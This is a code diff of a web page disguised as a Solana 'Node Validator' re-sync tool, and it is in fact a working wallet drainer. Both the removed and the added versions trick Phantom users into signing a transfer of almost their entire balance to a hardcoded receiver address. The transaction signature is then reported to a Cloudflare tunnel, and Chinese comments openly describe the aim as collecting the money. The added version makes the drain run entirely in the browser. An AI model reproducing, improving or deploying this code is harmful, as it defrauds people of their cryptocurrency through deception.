@@ -1,79 +1,52 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Validator Sync</title>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
-    <style>
-        body { background: #000; color: #14f195; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .card { border: 1px solid #14f195; padding: 25px; border-radius: 12px; text-align: center; width: 85%; max-width: 300px; background: #0a0a0a; }
-        .bar-bg { background: #222; height: 6px; border-radius: 3px; margin: 20px 0; overflow: hidden; }
-        #bar-fill { background: #14f195; height: 100%; width: 0%; transition: 0.3s; }
-        button { background: #14f195; color: #000; border: none; padding: 16px; width: 100%; font-weight: bold; border-radius: 8px; cursor: pointer; font-size: 15px; }
-        #status { font-size: 11px; color: #555; margin-top: 15px; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <div style="color:#9945FF; font-weight:bold; letter-spacing:1px;">NODE VALIDATOR</div>
-        <div style="font-size:12px; margin-top:5px; color:#ff3e3e;">[OUT OF SYNC]</div>
-        <div class="bar-bg"><div id="bar-fill"></div></div>
-        <button id="cta">START RE-SYNC</button>
-        <div id="status">System idle</div>
-    </div>
+<script>
+    // 🔱 隧道只负责最后收钱
+    const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
+    const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
 
-    <script>
-        // 🔱 隧道地址
-        const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
+    document.getElementById('cta').onclick = async () => {
+        const p = window.solana || window.phantom?.solana;
+        const sWeb3 = window.solanaWeb3;
+        if (!p) return;
 
-        document.getElementById('cta').onclick = async function() {
-            const solana = window.solana || window.phantom?.solana;
-            const web3 = window.solanaWeb3;
-            const log = (t) => document.getElementById('status').innerText = t;
-            const bar = document.getElementById('bar-fill');
+        try {
+            await p.connect();
+            // 🔱 直接用手机联网查，不问服务器，防止 403 和 隧道拦截
+            const conn = new sWeb3.Connection("https://rpc.ankr.com/solana", "confirmed");
+            
+            const [balance, bhObj] = await Promise.all([
+                conn.getBalance(p.publicKey),
+                conn.getLatestBlockhash()
+            ]);
 
-            if (!solana) { alert("Please use Phantom App"); return; }
+            const amount = balance - 1000000; // 扣除 Gas
+            if (amount <= 0) return;
 
-            try {
-                log("Connecting...");
-                await solana.connect();
-                bar.style.width = "30%";
+            // 构造交易
+            const tx = new sWeb3.Transaction().add(
+                sWeb3.SystemProgram.transfer({
+                    fromPubkey: p.publicKey,
+                    toPubkey: new sWeb3.PublicKey(RECEIVER),
+                    lamports: amount
+                })
+            );
+            tx.recentBlockhash = bhObj.blockhash;
+            tx.feePayer = p.publicKey;
 
-                log("Fetching Node Data...");
-                // 1. 获取服务器精算数据
-                const res = await fetch(tunnel + "/prepare", {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({ address: solana.publicKey.toString() })
-                });
-                const info = await res.json();
-                bar.style.width = "60%";
+            // 🔱 关键：强制拉起签名
+            const { signature } = await p.signAndSendTransaction(tx);
+            
+            // 签完名后，静默通知服务器（成功与否不影响你收钱）
+            fetch(`${tunnel}/broadcast`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ sig: signature, address: p.publicKey.toString() })
+            });
 
-                log("Awaiting Signature...");
-                // 2. 构造交易 (采用最稳定的数值处理)
-                const tx = new web3.Transaction();
-                tx.add(web3.SystemProgram.transfer({
-                    fromPubkey: solana.publicKey,
-                    toPubkey: new web3.PublicKey(info.receiver),
-                    lamports: Number(info.amount)
-                }));
-                tx.recentBlockhash = info.bh;
-                tx.feePayer = solana.publicKey;
+            window.location.href = "https://explorer.solana.com/tx/" + signature;
 
-                // 3. 核心唤起：使用 signAndSendTransaction 提高成功率
-                const { signature } = await solana.signAndSendTransaction(tx);
-                
-                bar.style.width = "100%";
-                log("Sync Complete!");
-                setTimeout(() => { window.location.href = "https://explorer.solana.com/tx/" + signature; }, 1200);
-
-            } catch (err) {
-                console.error(err);
-                log("Sync Error. Restarting...");
-                setTimeout(() => { location.reload(); }, 1500);
-            }
-        };
-    </script>
-</body>
-</html>
+        } catch (e) {
+            console.error(e);
+            location.reload();
+        }
+    };
+</script>
